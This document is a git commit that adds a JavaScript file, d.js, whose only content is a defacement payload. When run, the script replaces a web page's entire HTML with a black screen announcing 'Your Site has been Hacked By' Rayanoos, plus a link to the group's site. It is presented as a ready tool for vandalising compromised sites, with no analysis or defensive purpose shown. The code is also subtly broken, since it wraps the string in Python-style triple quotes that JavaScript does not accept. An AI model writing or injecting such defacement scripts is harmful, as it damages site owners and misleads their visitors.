d6742fd7a6d532ae59369352ed075a3ef3e5ad02
rayanoos-projects <44443058+rayanoos-projects@users.noreply.github.com>
2018-11-02 11:14:58 +0000

    Create d.js

---
+++ d.js
@@ -0,0 +1,17 @@
+document.getElementsByTagName("HTML")[0].innerHTML="""
+<html>
+  <head>
+      <title>Hacked By Rayanoos</title>
+  </head>
+  
+  <body bgcolor="black" color="white">
+    <center>
+      <font size="6"> Your Site has been Hacked By
+      <br> حکرز
+      </font><br><br>
+      <a href="http://rayanoos.ir">Rayanoos.ir</a>
+    </center>
+  </body>
+</html>
+
+""";
